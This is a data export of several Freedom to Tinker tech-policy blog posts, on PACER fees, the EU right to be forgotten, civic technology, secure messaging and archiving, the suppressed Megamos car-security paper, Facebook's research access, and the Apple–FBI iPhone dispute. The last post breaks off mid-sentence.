"313","2013-02-07","2023-03-24","https://freedom-to-tinker.com/2013/02/07/making-excuses-for-fees-on-electronic-public-records/","I wrote a letter to Judge Hogan, the recently appointed Director of the Administrative Office of the US Courts. I wanted to make the case directly to him that the courts should do the right thing — and that what they are doing right now is against the law. I was assured by his colleagues on the bench that Hogan is a reasonable and judicious person, and that he would at least hear me out. Yesterday, his administrative assistant replied to me. She said that he had forwarded the letter to the people in the Public Access and Records Management Division (PARMD), and that he didn’t want to talk to me. She said that I could contact Public Affairs Office if I wanted to discuss it further. The PARMD folks have, in the past, forwarded my requests for things like the congressionally mandated Judiciary Information Technology Fund Report to the Public Affairs folks, who of course never respond. So, rather than participating in yet another bureaucratic run-around, I thought I’d outline the series of poor excuses that the Administrative Office has offered to justify their fees. If you’re a lawyer reading this, I invite you to consider what a lawsuit might look like. My email address is *protected email*. Before we get to the excuses, however, let’s review the law. 28 U.S.C. 1913 (note) says: The Judicial Conference may, only to the extent necessary, prescribe reasonable fees… to reimburse expenses incurred in providing these services. Upon passing the E-Government Act of 2002, Congress noted its intent for the “only to the extent necessary” language: The Committee intends to encourage the Judicial Conference to move from a fee structure in which electronic docketing systems are supported primarily by user fees to a fee structure in which this information is freely available to the greatest extent possible. For example, the Administrative Office of the United States Courts operates an electronic public access service, known as PACER, that allows users to obtain case and docket information from Federal Appellate, District and Bankruptcy courts, and from the U.S. Party/Case Index. Pursuant to existing law, users of PACER are charged fees that are higher than the marginal cost of disseminating the information. The current fees are unquestionably greater than the cost of providing the services. Since passage of the E-Government Act, the cost of storing and delivering bits of data over the Internet has continued to fall precipitously, and the cost of PACER access has gone up by 42 percent. The courts conveniently compiled many of their excuses in a document entitled, “Electronic Public Access Program Summary: December 2012.” I should be clear that even if these excuses had some grain of truth, none of them could erase the simple fact that the courts are charging much more than the law allows. Nevertheless, I feel some need to point out how ridiculous they are, even on their own terms. Here’s the breakdown: Excuse #1: “PACER is cheap” Whether or not PACER is subjectively inexpensive is immaterial. The law says that the fees can only reimburse for the expense of the service, and the courts are charging more than that. End of story. Nevertheless, PACER is — subjectively — expensive. Although it costs “only 10 cents per page,” the system charges not only per page for documents, but per “page” of search results, and per “page” of docket listings. It is easy to quickly run up a huge bill unless you are looking for one particular thing and you know exactly how to find it. This is not the Internet way of doing things. If you are a researcher or investigative reporter who needs access to the full corpus of PACER records for analysis, my back-of-the-envelope calculations put the price at about half a billion dollars. Excuse #2: “Fee waivers are available” It’s true that PACER users can apply for a fee waiver from a particular district or bankruptcy court. There are, of course, a few catches. First of all, obtaining a waiver requires filing a separate request with each court, which may grant and revoke the waiver at its discretion. Individuals with fee waivers are prohibited from redistributing these public records. Many classes of individuals are not even eligible to apply, including the media. There is also my personal favorite, “An exemption applies only to access related to the case or purpose for which it was given.” So, if you are willing to give the courts your credit card, file a formal application to all of the courts for which you seek access, if the courts like the “purpose” that you state, and if they don’t arbitrarily decide to revoke your waiver, you can download (but not share) documents. What happens when a watchdog organization applies for and receives a fee waiver? Evidently they receive it, only to have it revoked shortly thereafter. Likewise, if you’re an academic, don’t criticize the court that gave you the waiver, because they may not renew it next time. Of course, anyone without a fee waiver is paying more than the cost of the service — in violation of the law. In fact, they’re paying the freight of all of those greedy fee-waiver freeloaders. Excuse #3: “You won’t be charged for fees under $15 per quarter” As long as you don’t rack up a PACER bill of more than $15 per quarter, you won’t be charged. Apparently this works for some users. The courts claim that “approximately 65-to-75 percent of active users have fee waivers for at least one quarter.” I don’t know what constitutes “active users,” but I can certainly believe that during some quarters, many registered users don’t use PACER much. I can also imagine that quite a few people try using PACER but give up quickly because the interface is so non-intuitive and the search is so inferior. I guess it’s nice of them to automatically waive some fees, but it doesn’t come close to addressing the more fundamental problems — or making the fee policy legal. Excuse #4: “Congress said that we’re allowed to spend PACER funds on other things” This is false. It’s shameful that the US Courts are misrepresenting the law. They should know better. Their excuse here is that the appropriators have indicated in a series of committee reports and letters that they have no problem with the courts expanding PACER fee use to other areas. The appropriators have a vested interest, which is of course to appropriate less. That being said, they have not made any changes to the law. Letters and report language are not the law. The law is the law. Excuse #5: “We are making opinions available for free via the GPO” Three years ago, the US Courts started a project in partnership with the Government Printing Office. Some courts were given the option of sending opinions over to the GPO, which would publish them — get this — for free! At the moment, only 19 of the 95 district courts are participating, but the courts recently announced that they would allow any other interested courts to join the trial. So, perhaps in a few years, all courts will upload their opinions to the GPO. The metadata aren’t as complete as what’s on PACER, and it’s hard to monitor for updates. More fundamentally, the archive omits everything other than final opinions (and it relies on judges to appropriately flag what is an opinion and what is not, which they have had trouble doing in the past). It is useless for following ongoing cases or for many types of research, but it’s better than nothing. Of course, it’s just a distraction from the fact that the courts are not following the law with respect to PACER fees. Fun fact: Historically, the courts deposited all paper case materials with the National Archives and Records Administration. You could obtain every record from a proceeding at cost from NARA. Per NARA disposition schedule N1-021-10-2, the courts were supposed to begin depositing electronic records 3 years after a case closed, but to date they haven’t deposited any electronic records. Excuse #6: “You can always go to the courthouse” This is a good one. The Administrative Office will tell you that you can go to your local courthouse to access PACER records for free. Well, maybe not “local,” but you can go to the district, bankruptcy, or circuit courthouse and access PACER. Of course, you can only access records for that particular court. You can’t access other PACER records. You also can’t download the records. You can only view them. If you want to print them, that will be 10 cents per page. That’s not legal. Excuse #7: “The heaviest users are rich” They won’t state this explicitly, but this excuse underlies many of the courts’ statements. Let’s pick apart this quote from the “Electronic Public Access Program Summary: December 2012” : “The largest user is the Department of Justice. Virtually all of the other high volume users are major commercial enterprises or financial institutions that collect massive amounts of data, typically for aggregation and resale.” I have reproduced their pie chart here. Let’s consider the first sentence. Where in this pie chart are the Department of Justice and all other governmental entities? I can’t tell. Can you? They say that “The majority of ‘other’ users are background investigators,” so it can’t be that category. I guess that the government users are part of the “Legal Sector.” We know that in 2009, the Department of Justice alone paid $4.167 million in PACER fees. So, taxpayers are already paying millions per year in PACER fees out of general tax funds. The unstated implication here is that the “high volume users,” who are “major commercial enterprises or financial institutions,” can afford to pay for PACER, so why not tax them at a rate higher than actual cost for access to the public record? Presumably, the courts think that it is acceptable to violate statute because it affects mostly well-endowed users. Excuse #8: “There is a high cost to providing electronic public access” Here is how the PACER system architecture works: every court runs its own local PACER server, with local support staff and a private leased network link to Washington, DC. Are you a system administrator? Are you an average citizen who has heard the word “cloud” in the past five years? Does this system architecture seem insane? It is. It is even more offensive in light of the fact that the GSA has had, for years, a streamlined government procurement system for cloud hosting. This system is certified at FISMA level 2 security, and is hosted in a “private cloud” for the government, which is good enough for the Department of Homeland Security. It is provided by companies like Amazon at only a fraction higher cost than their commercial offerings. The courts could host all of the PACER services in the cloud — tomorrow — for under $1 million per year. They could allow all of these local system administrators to control their own PACER installations. They could obtain greater cost savings (and security) by further consolidating PACER hosting and system administration. Of course, they feel no pressure to do so when they interpret the law to allow them to charge whatever they deem necessary. Excuse #9: “The Judiciary does not charge for access to judicial opinions” At some point, PACER added the option for judges to specify that a particular document was an “opinion.” When users download these documents, they are not charged. But what is an opinion? There have been years of hand-wringing over this question. Courts have been wildly inconsistent in their rate of accurately flagging opinions. The Administrative Office commissioned an expensive study. This is all ridiculous, because the law makes no distinction between fees for opinions versus other records. What’s more, in order to find the opinions in the first place, the average user has to search for them (and pay) and view the docket (and pay). Fun Fact: The PACER software allows each court to enable an RSS feed. This single feed lists every new document filed in that court (downloading the documents is not free). The feed maxes out at 200 entries. In busy districts, more than 200 documents can be filed in a matter of hours. I mentioned the uselessness of the RSS feed to a PARMD employee, who replied, “My understanding of RSS, (and I’m not an RSS expert) is that the selecting of individual cases (or individual articles/topics) from an RSS feed, is accomplished through the RSS reader.” Right. Well, in any case, the courts recently admitted that “70% of the district courts have not implemented” this useless feature anyway. Excuse #10: “PACER users are happy” The courts commissioned an extensive and unscientific study in order to determine that users were happy with PACER, and did not want free access. On the other hand, a Stanford Law librarian’s survey indicated that 95.5% of academic law libraries limited or rationed access to PACER for fear of paying too much. Public schools allowed students to spend less on PACER than private schools. The Administrative Office conducted a multi-year “multistakeholder” study in order to determine the “next generation” requirements for the electronic filing and PACER systems. No-fee access was not an option, nor were fees mentioned in the final report. None of the committee members represented the general public. I contacted the one person who was identified as a “stakeholder representative” for academia, who informed me, “I view it as my job to pass along thoughts; the committee decides what recommendations to make.” Of course, even if 100% of academics and the general public were happy with PACER fees, they’d still be against the law. We have allowed the courts to pass off these silly (and irrelevant) excuses for far too long. It’s time for Congress to fully Open PACER. Perhaps it’s also time for PACER users to exercise some self-help by suing."
"314","2014-05-14","2023-03-24","https://freedom-to-tinker.com/2014/05/14/google-spain-and-the-right-to-be-forgotten/","The European Court of Justice (CJEU) has decided the Google Spain case, which involves the “right to be forgotten” on the Internet. The case was brought by Mario Costeja González, a lawyer who, back in 1998, had unpaid debts that resulted in the attachment and public auction of his real estate. Notices of the auctions, including Mr. Costeja’s name, were published in a Spanish newspaper that was later made available online. Google indexed the newspaper’s website, and links to pages containing the announcements appeared in search results when Mr. Costeja’s name was queried. After failing in his effort to have the newspaper publisher remove the announcements from its website, Mr. Costeja asked Google not to return search results relating to the auction. Google refused, and Mr. Costeja filed a complaint with Spanish data protection authorities, the AEPD. In 2010, the AEPD ordered Google to de-index the pages. In the same ruling, the AEPD declined to order the newspaper publisher to take any action concerning the primary content, because the publication of the information by the press was legally justified. In other words, it was legal in the AEPD’s view for the newspaper to publish the information but a violation of privacy law for Google to help people find it. Google appealed the AEPD’s decision, and the appeal was referred by the Spanish court to the CJEU for a decision on whether Google’s publication of the search results violates the EU Data Protection Directive. The question presented to the CJEU by the case was “whether [the Directive is] to be interpreted as enabling the data subject to require the operator of a search engine to remove from the list of results displayed following a search made on the basis of his name links to web pages published lawfully by third parties and containing true information relating to him, on the ground that that information may be prejudicial to him or that he wishes it to be ‘forgotten’ after a certain time.” The CJEU has now answered that question in the affirmative: [I]f it is found, following a request by the data subject…, that the inclusion in the list of results displayed following a search made on the basis of his name of the links to web pages published lawfully by third parties and containing true information relating to him personally is, at this point in time, … inadequate, irrelevant or no longer relevant, or excessive in relation to the purposes of the processing at issue carried out by the operator of the search engine, the information and links concerned in the list of results must be erased. The search engine operator’s obligation, the CJEU went on to say, is triggered whether or not “the information in question in the list of results causes prejudice to the data subject.” It is limited, however, by a preponderant public interest in access to the information in question, if, for example, the subject is a public figure. Google Spain is not the first case involving search and the “right to be forgotten” in the EU. In January of this year, a German court ordered Google to purge its image search results of six images showing former Formula One president Max Mosely participating in a “Nazi-themed” sex party. The German decision followed a similar ruling in France involving the same photos. The Mosely photos, to my mind, present a closer privacy case than the Costeja auction announcements because they are intimate in nature and were not a matter of public record until they became fodder for scandal sheets. Whatever the circumstances of Mr. Costeja’s financial difficulties, they resulted in official action against his property. And, as any lawyer in the U.S. knows, an assessment of one’s character and fitness to practice law entails inquiry into how one handles money and debt. That may not be true for lawyers practicing in the EU, but it’s certainly true here. The evolving law in the EU concerning the “right to be forgotten” is problematic not only from the perspective of intermediary liability but also from the perspective of the integrity of the historical record. The CJEU’s embrace of a double standard with respect to the information (i.e., it was permissible for the newspaper to publish it in 1998 but not for Google to link to it in 2014) raises a difficult question about the law’s role in empowering people to sculpt their public information profiles to conform with an image of themselves that they want the world to see. There is no question in Mr. Costeja’s case that the information at issue was true or that it was appropriately publicized by the newspaper. Does damaging public information become private simply by virtue of the passage of time? How stale does information have to be to be considered “irrelevant or no longer relevant”? And what is the standard for measuring relevance? Relevant to what, to whom, or for what purpose? I can only imagine how the cottage industry of online reputation management will grow in the face of this expanding “right to be forgotten.” Search intermediaries will be more than ever curators of the content they index, which is a development that I, as a consumer of information and a user of search, don’t welcome. There is, undeniably, a certain brutality to the fact that information on the Internet can live forever. And there are surely circumstances in which private personal information that has become public is so damaging when weighed against its truth value that it shouldn’t be kept alive through persistent links. I worry, however, about the broad scope the CJEU seems to be creating for the “right to be forgotten.” As this door opens wider, the burdens on search intermediaries are becoming both greater and more nebulous, and the threat to the integrity of the digital historical record is increasing."
"315","2013-11-04","2023-03-24","https://freedom-to-tinker.com/2013/11/04/local-expertise-is-exceedingly-valuable-principle-7-for-fostering-civic-engagement-through-digital-technologies/","One of the most rewarding and enjoyable aspects of my research has been my series of conversations with innovators in civic engagement in various cities across the country. These conversations have been enlightening for me as I think about how Washington, DC can maximize its natural advantages to foster civic engagement in its neighborhoods. The ways in which a local community uses technology to share information and solve urban problems reflect its character. Two of the conversations that have helped shape my thinking took place earlier this year with Abby Miller, a Bloomberg Innovation Fellow and member of the Memphis Innovation Delivery Team and John Keefe from WNYC, the NPR station in New York City. Today, I will discuss their work leveraging the resources of their very different communities in very different roles – one working inside Memphis city government and the other in the media in New York City. Abby’s team is working on two major projects. The first is increasing the economic vitality of Memphis’s neighborhoods by helping residents launch new businesses. The second is helping Memphis reduce gun violence – particularly youth gun violence – in specific precincts and citywide. Both projects require coordination across several departments within Memphis’s city government and, of course, engagement with residents. Abby is fairly new to Memphis, but most of the members of the Memphis Innovation Team have been in the city for at least 5 years; providing a nice mix of old and new that has allowed them to connect well with people across the city. Money from Bloomberg Philanthropies provides human resources and technical help for Abby’s team’s projects, but her local team raises matching funding. Abby said that she views her projects as a bridge between community and government. Part of her job is finding value in local engagement and injecting the spirit of innovation into the city. Economic Vitality Abby’s approach to integrating her team into the city and using both on-line and off-line tools to engage citizens is very well thought-out. It has led to an understanding of who her stakeholders are and how to empower them to improve their communities. For the economic development project, Abby’s team began the brainstorming process with the community by hosting an “idea café’ session to crowd source solutions to Memphis’s economic development problems. A local bistro hosted the “idea café.” Attendees posted their ideas on the wall using sticky notes and Abby’s team tweeted out those ideas simultaneously. Abby’s team grouped the ideas and found common themes. Using Twitter allowed them to grow and diversify participation by including people who couldn’t be there in person. Abby liked the hybrid approach – physically in the neighborhood but using the Internet as a secondary tool. Build support for crowd sourcing off-line before it goes live. The result of planting the seeds for success is MEMShop – a collaborative effort with support from the City of Memphis, the Mayor’s Innovation Delivery Team, and other local partners. MEMShop creates partnerships to incubate new retail opportunities and showcase unique neighborhood assets by activating vacant storefronts for 3 to 6 months to help build local businesses and increase the visibility and vibrancy of neighborhoods. Abby told me that 33 applicants applied for 3 vacant storefronts after her team advertised the program on the web and through social media. Several examples of businesses that have successfully taken advantage of the program are the Five in One Social Club, My Heavenly Creations and NJ Woods Gallery and Design. In some cases, the potential business owners only needed $5,000 more to get their businesses started. From the City of Memphis’s perspective, starting 3 to 5 businesses for $20,000 is a good investment. Separately, as part of the city’s Neighborhood Economic Vitality Initiative, Abby’s team has been using the crowd sourcing platform ioby – In Our Back Yard – to attract funding for projects such as the innovative Hampline walking and biking trail and for smaller projects that allow residents to, for example, raise funding for supplies and mobilize volunteer hours for painting a mural on a blighted building. Abby said that training community members to use the platform has been very important because that’s how you get something to stick in the neighborhood. Her team is working in three neighborhoods – “one boarded up, one swing neighborhood, one up and coming.” This approach allows them, with the assistance of an organization called Community Lift, to conduct data-driven analysis of which packages of ideas work in certain neighborhoods. Violence Reduction One of the aims of Abby’s team is to re-orient Memphis’s city government to deliver services more effectively at the neighborhood level. The goal: When people in a neighborhood say something is happening, the government responds. In too many Memphis neighborhoods gun violence – particularly youth gun violence – is a significant problem. Since 25% of Memphis’s population is under age 18, Memphis’s youth violence reduction initiative is heavily reliant on social media. Abby’s team organizes and trains young people daily to use social networking tools to inform their peers – generally between 13-23 years old and living in neighborhoods affected by gun violence – about events promoting peaceful problem solving. Given the number of young people who access the Internet and social media primarily through their smartphones, the high school students organizing anti-violence rallies primarily reach their peers through Facebook or Twitter, which are easily accessible through mobile apps. On the Memphis Gun Down Facebook page, posts are signed by name, giving each young person a voice and identity. Abby told me that this social media-driven initiative is one example of a small financial investment having a big impact. John Keefe – Journalism in the Public Interest Earlier this year, I spoke with John Keefe from WNYC, the NPR station in New York, about his thoughts on journalism in the public interest and the ways in which both journalists and regular citizens can take government information and make it more useful for individuals and communities. John noted two important points: First, just by its nature, government often provides information in silos; and second, one solution is for people outside of government to aggregate government data and make it useful on a hyperlocal basis. During storm emergencies, John and his team pull information from a variety of sources into one location on-line and present it to the public in a user-friendly design. John’s goal is for citizens to be able to go to WNYC’s website and get the information that they need at the community level. I can see, for example, whether my home address or my parents’ neighborhood is in an evacuation zone. The reader has a sense of the big picture, but can drill down to a useful level of detail, such as whether the subway is still running in their neighborhood. Even though John described WNYC’s server as getting “crushed like election night” during Hurricane Irene, WNYC’s ability to remix government data still allows it to be “fleet of foot.” And also a valuable source of redundancy for the New York City’s on-line emergency notification efforts. Creative use of government data can also be a local economic development tool. While it is fairly well known that software developers are using many cities’ transit data to develop next bus apps, designing ways to display government data that are attractive, user-friendly and increase the usefulness of the underlying information do not have to be limited to mobile apps. For example, John told me that entrepreneurs created signs in coffee shops in Boston letting customers know the arrival time of the next bus. As those signs help coffee shop owners sell a few extra cups and allow customers to relax and enjoy their experiences longer, we see another way in which open government improves peoples’ lives and strengthens local communities."
"316","2013-07-09","2023-03-24","https://freedom-to-tinker.com/2013/07/09/take-over-my-dream-job-associate-director-at-citp/","Nearly four years ago, I joined the Center for Information Technology Policy at Princeton as Associate Director. The CITP community is a fantastic collection of smart and funny people who work passionately on all aspects of information technology policy. It was my dream job, so it was bittersweet when I accepted a new job working on internet freedom programs at the State Department. However, this means that someone else has a chance to step into this incredible position. If you love tech policy and want to help lead a vibrant and growing research center, you can now apply to be the Associate Director of the Center for Information Technology Policy at Princeton. I am happy to answer any questions that you may have, at *protected email*. In my new role at the State Department, I help to award and oversee grants to groups that are supporting internet freedom worldwide. This includes technology tools as well as advocacy, training, and research. I am always eager to hear from folks with projects or ideas, and part of my goal is to help support the growing internet freedom community however I can. Feel free to email me at *protected email*, and to submit a Statement of Interest (SOI) for technology projects (the next quarterly round of SOI’s are due on August 30th)."
"317","2017-07-07","2023-03-24","https://freedom-to-tinker.com/2017/07/07/on-encryption-archiving-and-accountability/","“As Elites Switch to Texting, Watchdogs Fear Loss of Accountability“, says a headline in today’s New York Times. The story describes a rising concern among rule enforcers and compliance officers: Secure messaging apps like WhatsApp, Signal and Confide are making inroads among lawmakers, corporate executives and other prominent communicators. Spooked by surveillance and wary of being exposed by hackers, they are switching from phone calls and emails to apps that allow them to send encrypted and self-destructing texts. These apps have obvious benefits, but their use is causing problems in heavily regulated industries, where careful record-keeping is standard procedure. Among those “industries” is the government, where laws often require that officials’ work-related communications be retained, archived, and available to the public under the Freedom of Information Act. The move to secure messaging apps frustrates these goals. The switch to more secure messaging is happening, and for good reason, because old-school messages are increasingly vulnerable to compromise–the DNC and the Clinton campaign are among the many organizations that have paid a price for underestimating these risks. The tradeoffs here are real. But this is not just a case of choosing between insecure-and-compliant or secure-and-noncompliant. The new secure apps have three properties that differ from old-school email: they encrypt messages end-to-end from the sender to the receiver; they sometimes delete messages quickly after they are transmitted and read; and they are set up and controlled by the end user rather than the employer. If the concern is lack of archiving, then the last property–user control of the account, rather than employer control–is the main problem. And of course that has been a persistent problem even with email. Public officials using their personal email accounts for public business is typically not allowed (and when it happens by accident, messages are supposed to be forwarded to official accounts so they will be archived), but unreported use of personal accounts has been all too common. Much of the reporting on this issue (but not the Times article) makes the mistake of conflating the personal-account problem with the fact that these apps use encryption. There is nothing about end-to-end encryption of data in transit that is inconsistent with archiving. The app could record messages and then upload them to an archive–with this upload also protected by end-to-end encryption as a best practice. The second property of these apps–deleting messages shortly after use–has more complicated security implications. Again, the message becoming unavailable to the user shortly after use need not conflict with archiving. The message could be uploaded securely to an archive before deleting it from the endpoint device. You might ask why the user should lose access to a message when that message is still stored in an archive. But this makes some sense as a security precaution. Most compromises of communications happen through the user’s access, for example because an attacker can get the user’s login credentials by phishing. Taking away the user’s access, while retaining access in a more carefully guarded archive, is a reasonable security precaution for sensitive messages. But of course the archive still poses a security risk. Although an archive ought to be more carefully protected than a user account would be, the archive is also a big, high-value target for attackers. The decision to create an archive should not be taken lightly, but it may be justified if the need for accountability is strong enough and the communications are not overly sensitive. The upshot of all of this is that the most modern, secure approaches to secure communication are not entirely incompatible with the kind of accountability needed for government and some other users. Accountable versions of these types of services could be created. These would be less secure than the current versions, but more secure than old-school communications. The barriers to creating these are institutional, not technical."
"318","2013-08-08","2023-03-24","https://freedom-to-tinker.com/2013/08/08/british-court-blocks-publication-of-car-security-paper/","Recently a British court ordered researchers to withdraw a paper, “Dismantling Megamos Security: Wirelessly Lockpicking a Vehicle Immobiliser” from next week’s USENIX Security Symposium. This is a blow not only to academic freedom but also to progress in vehicle security. And for those of us who have worked in security for a long time, it raises bad memories of past attempts to silence researchers, which have touched many of us over the years. The paper, by Flavio Garcia of the University of Birmingham and Roel Verdult and Baris Ege of Radboud University Niemegen, would have discussed the operation and security of Megamos, a cryptography-based system used in most or all recent Volkswagen-made vehicles. Megamos wirelessly authenticates a key to the car, and vice versa, so that the car can be started only by an authorized key. Unfortunately, as the paper would have explained, Megamos has vulnerabilites that would allow an attacker to start the car without a legitimate key in some circumstances. There is a fallacy, typically more common among non-experts, that only “constructive” security research—that is, research that claims to describe a secure system—has value. In fact, case studies of vulnerabilities can be very valuable. Given that most security systems turn out to be vulnerable, it pays to understand in detail how and why sophisticated designers end up shipping vulnerable technologies—which is exactly what the Megamos paper was apparently trying to do. This case has strong echoes of an incident in 2001, when the Recording Industry Association of America and some other entities threatened to sue my colleagues and me over our case study of several copy protection technologies for compact discs. The RIAA and friends threatened to sue us and others if we went ahead with publication of our paper. Under these threats, we withdrew the paper from its original venue and went to court to secure the right to publish. With help from the EFF, USENIX, and others, we were eventually able to publish our work in the 2001 USENIX Security Symposium. The two cases are similar in many ways. Both involved a case study paper that described how a technology worked and why it was vulnerable. Both papers were fully peer reviewed and accepted for publication, and in both cases affected companies knew about the papers well in advance but acted only late in the game to try to block publication. We faced threats of a lawsuit, whereas the Megamos researchers were actually ordered by a court not to publish (pending further court proceedings). And in both cases the threatening companies seemed to be motivated mostly by a fear of embarrassment due to their poor engineering choices becoming public. As usual, the attempt to avoid embarrassment will fail. By trying to block publication, the company is effectively admitting that it has something to hide and that the paper is correct in saying that Megamos is vulnerable. Of course trying to block the paper will only draw more attention to the flawed technologies. But what the company might succeed in doing is to withhold from researchers and practitioners the main value of the paper, which is its diagnosis of exactly what went wrong and why, that is, the lessons it teaches for the future. This is yet another example of the legal system’s apparent ambivalence about security research. We hear that digital insecurity is a major challenge facing society. But at the same time the law seems too eager to block or deter the very research and scholarly communication that can help us learn how to do better."
"319","2021-08-05","2023-03-24","https://freedom-to-tinker.com/2021/08/05/facebooks-illusory-promise-of-transparency/","By Orestis Papakyriakopoulos, Ashley Gorham, Eli Lucherini, Mihir Kshirsagar, and Arvind Narayanan. Facebook’s latest move to obstruct academic research about its platform by disabling NYU’s Ad Observatory is deeply troubling. While Facebook claims to offer researchers access to its FORT Researcher Platform as an alternative, that is an illusory offer as we have recently learned first hand in connection with our ongoing research project that studies how the social media platforms amplified or moderated the distribution of political ads in the 2020 U.S. elections. As part of our research, in March 2021, we attempted to gain access to the FORT dataset. We were told by Facebook that we had to sign a “strictly non-negotiable” agreement that was “mandated by Cambridge Analytica and the FTC.” We pushed back on this ‘take-it-or-leave-it’ approach, noting that there was nothing in the consent decree that mandated such an agreement. Facebook later conceded in a subsequent email that they were under no legal mandate and that their approach was simply based on their internal business justification. We then continued to attempt to negotiate the terms of access with Facebook. In particular, a few clauses in the agreement were problematic for us. The most prominent one was a pre-publication review. We sought to clarify whether Facebook would assert that information about how the Facebook advertising platform was used to target political ads in the 2020 elections is “Confidential Information” that the agreement would allow them to “remove” from our publication. Understandably, we did not want to expend time on research without some assurance that we could publish our work without Facebook’s permission. Indeed, as we subsequently discovered, one project had negotiated to exclude such a clause. But Facebook has, to date, not explained its position to us on the pre-publication review. Separately, we had a more basic question about what additional data fields were available to researchers through the FORT Platform and whether there were any restrictions on the types of tools we could use to analyze the data. Despite promising that they would get back to us “shortly,” we are still waiting for a response since May, despite following up diligently. Our experience dealing with Facebook highlights their long running pattern of misdirection and doublespeak to dodge meaningful scrutiny of their actions. While researchers and investigative journalists have other means of analyzing the platform’s practices (e.g., Citizen Browser and Mozilla Rally), the reality is that Facebook has control over the information that the public needs to understand its powerful role in our society. And, if Facebook continues to hide behind illusory offers, we need legislation to force them to provide meaningful access."
"320","2013-09-10","2023-03-24","https://freedom-to-tinker.com/2013/09/10/no-facebook-no-service/","The Idaho Statesman, my sort-of-local newspaper, just announced that it will follow the lead of the Miami Herald and no longer allow readers to post anonymous comments to online stories. Starting September 15, readers who want to make comments will have to login through Facebook. This is the second time I’ve encountered a mandatory Facebook login for users trying to gain access to a third-party service. The first time was when I tried to sign up last year for the music streaming service Spotify. (Spotify now allows users to create an account using an email address, but it didn’t always.) I’m not a Facebook fan for reasons related to Facebook’s privacy and information practices, but that’s really neither here nor there. The question is whether I should have to be a Facebook user to access services on the Internet that have no natural or necessary connection to Facebook. I’m not talking here about giving users the option to login through Facebook if they want to share their online activities with Facebook friends. I’m talking about conditioning access to a non-Facebook service, or to some aspect of that service, on a user’s having a Facebook account. Internet users are accustomed to dealing with lots of intermediaries, from broadband providers to search engines, to get access to services and information. The Internet is all about mediated transfers of information. I get that. But this strikes me as a troubling new layer of intermediation. The Statesman’s motivation for the change in policy is to stop abusive, trolling behavior in comments. The idea, I suppose, is that people will be less inclined to say stupid things if they have to “own” their speech through some process of authentication. Or maybe they will be less inclined to speak at all if they have to go through an extra step to do it. Putting aside (very big and important) questions about the need to protect anonymous speech—both online and offline—in a democratic society, it seems to me that using Facebook as a means of authentication is flawed at best. Anyone can create a pseudonymous Facebook account. And then there’s the question of user choice. Why make Facebook the exclusive intermediary platform? What about other social media platforms like Linked In and Twitter? Do they provide less reliable authentication? Or are they just not as hegemonic? Does Facebook offer financial or other incentives to online providers to choose Facebook as the gateway to their services? Does anybody view this practice as a positive development for users? If so, I’m genuinely interested in hearing why. (By the way, you will not be required to login through Facebook to comment on this post.)"
"321","2016-02-17","2023-03-24","https://freedom-to-tinker.com/2016/02/17/apple-the-fbi-and-the-san-bernadino-iphone/","Apple just posted a remarkable “customer letter” on its web site. To understand it, let’s take a few steps back. In a nutshell, one of the San Bernadino shooters had an iPhone. The FBI wants to root through it as part of their investigation, but they can’t do this effectively because of Apple’s security features. How, exactly, does this work? Modern iPhones (and also modern Android devices) encrypt their internal storage. If you were to just cut the Flash chips out of the phone and read them directly, you’d learn nothing. But iPhones need to decrypt that internal storage in order to actually run software. The necessary cryptographic key material is protected by the user’s password or PIN. The FBI wants to be able to exhaustively try all the possible PINs (a “brute force search”), but the iPhone was deliberately engineered with a “rate limit” to make this sort of attack difficult. The only other option, the FBI claims, is to replace the standard copy of iOS with something custom-engineered to defeat these rate limits, but an iPhone will only accept an update to iOS if it’s digitally signed by Apple. Consequently, the FBI convinced a judge to compel Apple to create a custom version of iOS, just for them, solely for this investigation. I’m going to ignore the legal arguments on both sides, and focus on the technical and policy aspects. It’s certainly technically possible for Apple to do this. They could even engineer their customized iOS build to measure the serial number of the iPhone on which it’s installed, such that the backdoor would only work on the San Bernadino suspect’s phone, without being a general-purpose skeleton key for all iPhones. With all that as background, it’s worth considering a variety of questions. Does the FBI’s investigation actually need access to the internals of the iPhone in question? Apple’s letter states: When the FBI has requested data that’s in our possession, we have provided it. Apple complies with valid subpoenas and search warrants, as we have in the San Bernardino case. We have also made Apple engineers available to advise the FBI, and we’ve offered our best ideas on a number of investigative options at their disposal. In Apple’s FAQ on iCloud encryption, they describe how most iCloud features are encrypted both in transit and at rest, with the notable exception of email. So, if the San Bernadino suspect’s phone used Apple’s mail services, then the FBI can read that email. It’s possible that Apple genuinely cannot provide unencrypted access to other data in iCloud without the user’s passwords, but it’s also possible that the FBI could extract the necessary passwords (or related authentication tokens) from other places, like the suspect’s laptop computer. Let’s assume, for the sake of discussion, that the FBI has not been able to get access to anything else on the suspect’s iPhone or its corresponding iCloud account, and they’ve exhausted all of their technical avenues of investigation. If the suspect used Gmail or some other service, let’s assume the FBI was able to get access to that as well. So what might they be missing? SMS / iMessage. Notes. Photos. Even knowing what other apps the user has installed could be valuable, since many of them have corresponding back-end cloud services, chock full of tasty evidence. Of course, the suspects emails and other collected data might already make for a compelling case against them. We don’t know. Could the FBI still find a way into their suspect’s iPhone? Almost certainly yes. Just yesterday, the big news was a security critical bug in glibc that’s been around since 2008. And for every bug like this that the public knows about, our friends in the government have many more that they keep to themselves. If the San Bernadino suspect’s phone is sufficiently valuable, then it’s time to reach into the treasure chest (both figuratively and literally) and engineer a custom exploit. There’s plenty of attack surface available to them. That attack surface stretches to the suspect’s personal computers and other devices. The problem with this sort of attack plan is that it’s expensive, it’s tricky, and it’s not guaranteed to work. Since long before the San Bernadino incident, the FBI has wanted a simpler solution. Get a legal order. Get access. Get evidence. The San Bernadino case clearly spells this out. What’s so bad about Apple doing what the FBI wants? Apple’s concern is the precedent set by the FBI’s demand and the judge’s order. If the FBI can compel Apple to create a backdoor like this, then so can anybody else. You’ve now opened the floodgates to every small-town police chief, never mind discovery orders in civil lawsuits. How is Apple supposed to validate and prioritize these requests? What happens when they come from foreign governments? If China demands a custom software build to attack a U.S. resident, how is Apple supposed to judge whether that user and their phone happen to be under the jurisdiction of Chinese law? What if the U.S. then passes a law prohibiting Apple from honoring Chinese requests like this? That way lies madness, and that’s where we’re going. Even if we could somehow make this work, purely as an engineering matter, it’s not feasible to imagine a backdoor mechanism that will support the full gamut of seemingly legal requests to exercise it. Is backdoor engineering really feasible? What are the tradeoffs? If there’s anything that the computer security community has learned over the years, it’s that complexity is the enemy of security. One highly relevant example is SSL/TLS support for “export-grade cryptography” — a bad design left over from the 1990’s when the U.S. government tried to regulate the strength of cryptographic products. Last year’s FREAK attack boils down to an exploit that forces SSL/TLS connections to operate with degraded key quality. The solution? Remove all export-grade cipher suites from SSL/TLS implementations, since they’re not used and not 